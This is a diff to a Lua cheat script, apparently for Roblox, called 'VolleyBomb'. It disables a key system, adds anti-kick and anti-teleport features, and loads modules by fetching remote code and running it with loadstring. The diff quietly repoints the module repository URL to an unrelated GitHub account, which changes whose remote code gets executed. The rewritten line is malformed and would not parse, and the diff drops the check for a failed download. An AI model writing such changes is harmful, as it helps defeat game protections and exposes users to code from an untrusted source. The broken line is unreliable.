@@ -18,17 +18,16 @@ local CONFIG = {
     RetryCount = 3, RetryDelay = 0.6, Timeout = 20,
     UseCache = true, CacheDir = "VolleyBomb/cache/",
     -- recursos
-    DisableKeySystem = true, UnlockFPS = true, AntiAFK = true,
-    AntiFling = true, AntiKick = true, AutoRejoin = true,
+    DisableKeySystem = true, UnlockFPS = true, AntiFling = true, AntiTP = true, AntiKick = true, AutoRejoin = true,
     SafeMode = true, ShowHUD = true, ShowLog = true,
-    CloseDelay = 1.4,
+    CloseDelay = 20,
     -- limites
     RemoteBudgetPerSec = 45,
     FlingVelocityCap = 900,
     TPThreshold = 30,
     -- links
     Discord = "https://discord.gg/volleybomb",
-    REPO = "https://raw.githubusercontent.com/Biskus0/VolleyBomb/refs/heads/main/",
+    REPO = "REPO = "https://raw.githubusercontent.com/ghousting1234-sketch/.khh/refs/heads/main/",
     UIC  = "https://raw.githubusercontent.com/Biskus0/UIConstructor/refs/heads/main/",
 }
 
@@ -42,6 +41,7 @@ local HttpService  = game:GetService("HttpService")
 local VirtualUser  = game:GetService("VirtualUser")
 local Lighting     = game:GetService("Lighting")
 local Workspace    = game:GetService("Workspace")
+local StarterGui   = game:GetService("StarterGui")
 
 local LP = Players.LocalPlayer
 local IS_MOBILE = UserInput.TouchEnabled and not UserInput.KeyboardEnabled
@@ -80,9 +80,11 @@ local function log(...)
             l.TextColor3 = Color3.fromRGB(140, 148, 162)
             l.Text = ("%s  %s"):format(os.date("%H:%M:%S"), msg)
             l.Parent = S.logBox
-            S.logBox.CanvasSize = UDim2.new(0, 0, 0, #S.logBox:GetChildren() * 15)
             local sc = S.logBox.Parent
-            if sc then task.defer(function() pcall(function() sc.CanvasPosition = Vector2.new(0, 1e5) end) end) end
+            if sc then
+                sc.CanvasSize = UDim2.new(0, 0, 0, #S.logBox:GetChildren() * 15)
+                task.defer(function() pcall(function() sc.CanvasPosition = Vector2.new(0, 1e5) end) end)
+            end
         end)
     end
     print("[VolleyBomb]", msg)
@@ -848,8 +850,8 @@ _G.VolleyBombPanic = panic
 
 --==================== main =======================================--
 local function loadModule(url, label)
+    if not loadstring then log("Executor sem loadstring"); return nil end
     local src = httpGet(url)
-    if not src then log("FALHA: " .. label); return nil end
     local chunk = loadstring(src, "=" .. label)
     if not chunk then log("Sintaxe invalida: " .. label); return nil end
     local ok, res = pcall(chunk)
